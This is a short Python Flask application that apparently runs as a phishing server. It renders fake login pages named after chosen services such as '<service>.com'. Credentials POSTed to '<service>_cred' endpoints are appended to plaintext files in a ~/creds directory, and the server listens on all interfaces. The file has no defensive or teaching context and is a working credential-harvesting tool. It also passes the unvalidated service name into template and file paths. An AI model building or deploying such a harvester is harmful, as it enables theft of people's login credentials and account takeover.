from flask import Flask, request, render_template
from os.path import expanduser
import os
import errno

app = Flask(__name__)

CREDS_DIR = expanduser('~') + '/creds'


@app.route('/<service>.com')
def login_page(service):
    return render_template('%s.com.html' % service)


@app.route('/<service>_cred', methods=['POST'])
def store_cred(service):
    # Create directory if it doesn't already exist
    try:
        os.makedirs(CREDS_DIR)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(CREDS_DIR):
            pass
        else:
            raise
    with open('%s/%s.txt' % (CREDS_DIR, service), 'a') as f:
        f.write(request.data.decode() + '\n')

    return ''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2023, debug=False)
